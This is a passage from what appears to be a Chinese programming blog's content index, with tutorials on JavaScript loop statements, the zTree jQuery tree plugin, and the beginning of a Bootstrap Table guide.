punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    even <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span></code></pre><p><strong>示例：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"当前i的值为："</span><span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span>初始化表达式<span class="token punctuation">;</span>条件<span class="token punctuation">;</span>递增表达式<span class="token punctuation">)</span> <span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span></code></pre><ul><li><strong>初始化表达式：确定循环变量的初始值，只在循环开始时执行一次。</strong></li><li><strong>条件表达式：每轮循环开始时，都要执行这个条件表达式，只有值为真时才会继续进行循环。</strong></li><li><strong>递增表达式：每轮循环的最后一个操作，通常用来递增循环变量。</strong></li></ul><p><strong>示例：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> x <span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>”当前i的值为：“<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">do</span><span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>do…while和while唯一的区别在于，do…while必须执行一次。示例：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-bash"><code class="language-bash">012</code></pre><h4 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a>break语句和continue语句</h4><blockquote><p><strong>break和continue都具有跳转的作用。</strong></p></blockquote><p><strong>break语句用于跳转代码块或者循环。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"循环的次数："</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">===</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>j<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"当前的i值为："</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>continue是立即停止本轮循环，跳转到循环的头部，执行下一次循环。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  i<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'i 当前为：'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>上面的代码只有i的值为奇数时才会输入，为偶数的时候执行下一轮循环。</strong></p><h4 id="标签-label"><a href="#标签-label" class="headerlink" title="标签(label)"></a>标签(label)</h4><pre><code>label:    代码块</code></pre><p><strong>标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。</strong></p><p><strong>标签通常与break和continue语句配合使用，跳出特定循环。</strong></p><pre class=" language-javascript"><code class="language-javascript">top<span class="token punctuation">:</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span> top<span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'i='</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">', j='</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// i=0, j=0</span><span class="token comment" spellcheck="true">// i=0, j=1</span><span class="token comment" spellcheck="true">// i=0, j=2</span><span class="token comment" spellcheck="true">// i=1, j=0</span></code></pre><pre class=" language-javascript"><code class="language-javascript">top<span class="token punctuation">:</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">continue</span> top<span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'i='</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">', j='</span> <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// i=0, j=0</span><span class="token comment" spellcheck="true">// i=0, j=1</span><span class="token comment" spellcheck="true">// i=0, j=2</span><span class="token comment" spellcheck="true">// i=1, j=0</span><span class="token comment" spellcheck="true">// i=2, j=0</span><span class="token comment" spellcheck="true">// i=2, j=1</span><span class="token comment" spellcheck="true">// i=2, j=2</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zTree 文件树</title>
      <link href="/2019/06/03/ztree-wen-jian-shu/"/>
      <url>/2019/06/03/ztree-wen-jian-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="zTree-文件树"><a href="#zTree-文件树" class="headerlink" title="zTree 文件树"></a>zTree 文件树</h1><h2 id="zTree简介"><a href="#zTree简介" class="headerlink" title="zTree简介"></a>zTree简介</h2><blockquote><h4 id="zTree-是一个依靠-jQuery-实现的多功能-“树插件”。优异的性能、灵活的配置、多种功能的组合是-zTree-最大优点。"><a href="#zTree-是一个依靠-jQuery-实现的多功能-“树插件”。优异的性能、灵活的配置、多种功能的组合是-zTree-最大优点。" class="headerlink" title="zTree 是一个依靠 jQuery 实现的多功能 “树插件”。优异的性能、灵活的配置、多种功能的组合是 zTree 最大优点。"></a>zTree 是一个依靠 jQuery 实现的多功能 “树插件”。优异的性能、灵活的配置、多种功能的组合是 zTree 最大优点。</h4></blockquote><p><strong>这当然是官方给的说法，不过我也是这么觉得。当你使用了会发现还是很有趣的。</strong></p><h2 id="运用场景"><a href="#运用场景" class="headerlink" title="运用场景"></a>运用场景</h2><p>运用场景其实并不广泛，一般在后台管理页面出现的身影比较多。简单的结构我们都是悬着表格来展现。像文件浏览，资产管理，权限管理就可以看到它的身影了。</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><p>在官网很多实例我们下载文件时都有，我们可以查看他们是如何实现的。</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/metroStyle/metroStyle.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   //metro风格<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/jquery.ztree.all.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>请不要忘记了加载jQuery。</code></pre><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-lg-1 modal-content<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>regionZTree<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ztree<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="自定义Js"><a href="#自定义Js" class="headerlink" title="自定义Js"></a>自定义Js</h3><pre class=" language-js"><code class="language-js">zTreeObj <span class="token operator">=</span> $<span class="token punctuation">.</span>fn<span class="token punctuation">.</span>zTree<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#regionZTree"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> setting<span class="token punctuation">,</span> treelist<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> setting <span class="token operator">=</span> <span class="token punctuation">{</span>    view<span class="token punctuation">:</span> <span class="token punctuation">{</span>        addHoverDom<span class="token punctuation">:</span> addHoverDom<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//添加创建文件夹按钮</span>        removeHoverDom<span class="token punctuation">:</span> removeHoverDom<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//去除创建文件夹按钮</span>        dblClickExpand<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//双击节点时，是否自动展开父节点的标识</span>        showLine<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//是否显示节点之间的连线</span>        fontCss<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'black'</span><span class="token punctuation">,</span><span class="token string">'font-weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//字体样式函数</span>        selectedMulti<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">//设置是否允许同时选中多个节点</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    check<span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//chkboxType: { "Y": "ps", "N": "ps" },</span>        chkboxType<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"Y"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"N"</span><span class="token punctuation">:</span> <span class="token string">""</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        chkStyle<span class="token punctuation">:</span> <span class="token string">"checkbox"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//复选框类型</span>        enable<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">//每个节点上是否显示 CheckBox</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    edit<span class="token punctuation">:</span><span class="token punctuation">{</span>        enable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        editNameSelectAll<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        showRemoveBtn <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        showRenameBtn <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        removeTitle <span class="token punctuation">:</span> <span class="token string">"remove"</span><span class="token punctuation">,</span>        renameTitle <span class="token punctuation">:</span> <span class="token string">"rename"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> <span class="token punctuation">{</span>        simpleData<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//简单数据模式</span>            enable<span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>            idKey<span class="token punctuation">:</span> <span class="token string">"id"</span><span class="token punctuation">,</span>            pIdKey<span class="token punctuation">:</span> <span class="token string">"IPARENTID"</span><span class="token punctuation">,</span>            rootPId<span class="token punctuation">:</span> <span class="token keyword">null</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    callback<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// beforeExpand:zTreeBeforeExpand, // 用于捕获父节点展开之前的事件回调函数，并且根据返回值确定是否允许展开操作</span>        beforeRightClick<span class="token punctuation">:</span> zTreeBeforeRightClick<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//用于捕获 zTree 上鼠标右键点击之前的事件回调函数，并且根据返回值确定触发 onRightClick 事件回调函数</span>        onClick<span class="token punctuation">:</span> Spanningtree<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//用于捕获节点被点击的事件回调函数</span>        onRightClick<span class="token punctuation">:</span> Downtreefile<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//用于捕获 zTree 上鼠标右键点击之后的事件回调函数</span>        onDrop<span class="token punctuation">:</span> Throwfile<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//用于捕获节点拖拽操作结束的事件回调函数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="zTree解析"><a href="#zTree解析" class="headerlink" title="zTree解析"></a>zTree解析</h2><pre class=" language-html"><code class="language-html">zTreeObj = $.fn.zTree.init($("#regionZTree"), setting, treelist); //第一个参数是我需要显示tree的地方，第二个参数时我们针对tree的设置，第三个参数时数据源</code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>从上面可以看到我们还需要传入一个参数treelist。那treelist具体是什么一个形式呢？</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> nodes <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"父节点1"</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"子节点1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"子节点2"</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> nodes <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>id<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> pId<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token string">"父节点1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>id<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">,</span> pId<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token string">"子节点1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>id<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span> pId<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token string">"子节点2"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>简单模式的 JSON 数据需要使用 id <span class="token operator">/</span> pId 表示节点的父子包含关系<span class="token punctuation">.</span></code></pre><p><strong>个人比较中意第一种，因为这个就像json一样，首先我们也方便构造，也很直观可以看清父子的关系。</strong></p><h3 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h3><blockquote><h5 id="具体的setting请查看官方的API文档。"><a href="#具体的setting请查看官方的API文档。" class="headerlink" title="具体的setting请查看官方的API文档。"></a>具体的setting请查看官方的API文档。</h5></blockquote><ul><li><p>view(视图类)</p><p>视图相关的设置。这个也类似键值对，你只需要知道Key的使用方法，value则是自定的方法名。</p></li><li><p>callback(回调机制)</p></li></ul><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">zTreeOnClick</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> treeId<span class="token punctuation">,</span> treeNode<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span>treeNode<span class="token punctuation">.</span>tId <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> treeNode<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> setting <span class="token operator">=</span> <span class="token punctuation">{</span>    callback<span class="token punctuation">:</span> <span class="token punctuation">{</span>        onClick<span class="token punctuation">:</span> zTreeOnClick    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li><p><strong>event</strong></p><p><strong>记录触发的事件</strong></p></li><li><p><strong>treeId</strong></p><p><strong>触发的treeid</strong></p></li><li><p><strong>treeNode</strong></p><p><strong>这个将记录我们传入的文件数据。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ztree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap Table</title>
      <link href="/2019/06/03/bootstrap-table/"/>
      <url>/2019/06/03/bootstrap-table/</url>
      
        <content type="html"><![CDATA[<h1 id="Bootstrap-Table"><a href="#Bootstrap-Table" class="headerlink" title="Bootstrap Table"></a>Bootstrap Table</h1><h2 id="一，什么是Bootstrap-Table"><a href="#一，什么是Bootstrap-Table" class="headerlink" title="一，什么是Bootstrap Table"></a>一，什么是Bootstrap Table</h2><p><strong>其实从英文翻译就得知了，是一款Bootstrap的表格插件。</strong></p><p><strong>Bootstrap Table可用快速的建表，查询，分页，排序，等一系列功能。</strong></p><h2 id="二，Bootstrap-Table模式"><a href="#二，Bootstrap-Table模式" class="headerlink" title="二，Bootstrap Table模式"></a>二，Bootstrap Table模式</h2><blockquote><p>Boostatrp Table分为两种模式：客户端(client)模式,服务端(server)模式。</p></blockquote><ul><li><p><strong>客户端</strong></p><p><strong>通过数据接口将服务器需要加载的数据一次性展现出来，然后装换成Json然后生成table。我们可以自己定义显示行数，分页等。此时就不再会向服务器发送请求了。</strong></p></li><li><p><strong>服务器</strong></p><p><strong>根据设定的每页记录数和当前显示页，发送数据到服务器进行查询。</strong></p></li></ul><h2 id="三，Bootstrap-Table使用"><a href="#三，Bootstrap-Table使用" class="headerlink" title="三，Bootstrap Table使用"></a>三，Bootstrap Table使用</h2><h4 id="下载插件Bootstrap-Table"><a href="#下载插件Bootstrap-Table" class="headerlink" title="下载插件Bootstrap Table"></a>下载插件<a href="https://bootstrap-table.com/" target="_blank" rel="noopener">Bootstrap Table</a></h4><h4 id="引用插件"><a href="#引用插件" class="headerlink" title="引用插件"></a>引用插件</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/bootstrap-table.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/bootstrap-table.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/bootstrap-table-zh-CN.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    //中文表格不乱码</code></pre><p><strong>自定义JS</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> $newtable<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">InitMainTable</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// console.log(data);</span>    window<span class="token punctuation">.</span>operateEvents <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'click .download'</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">,</span>value<span class="token punctuation">,</span>row<span class="token punctuation">,</span>index<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">xxx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    $newtable <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tb_departments'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bootstrapTable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// url: '/Home/GetDepartment',         //请求后台的URL（*）</span>        <span class="token comment" spellcheck="true">// method: 'get',                      //请求方式（*）</span>        data<span class="token punctuation">:</span> data<span class="token punctuation">,</span>        silent<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        toolbar<span class="token punctuation">:</span> <span class="token string">'#toolbar'</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//工具按钮用哪个容器</span>        striped<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                      <span class="token comment" spellcheck="true">//是否显示行间隔色</span>        cache<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">//是否使用缓存，默认为true，所以一般情况下需要设置一下这个属性（*）</span>        pagination<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true">//是否显示分页（*）</span>        sortable<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">//是否启用排序</span>        sortOrder<span class="token punctuation">:</span> <span class="token string">"asc"</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true">//排序方式</span>        queryParams<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> temp <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的</span>                limit<span class="token punctuation">:</span> params<span class="token punctuation">.</span>limit<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//页面大小</span>                offset<span class="token punctuation">:</span> params<span class="token punctuation">.</span>offset<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//页码s</span>                search<span class="token punctuation">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#productLine'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//传递参数（*）</span>        sidePagination<span class="token punctuation">:</span> <span class="token string">"client"</span><span class="token punctuation">,</span>           <span class="token comment" spellcheck="true">//分页方式：client客户端分页，server服务端分页（*）</span>        pageNumber<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">//初始化加载第一页，默认第一页</span>        pageSize<span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">//每页的记录行数（*）</span>        pageList<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token 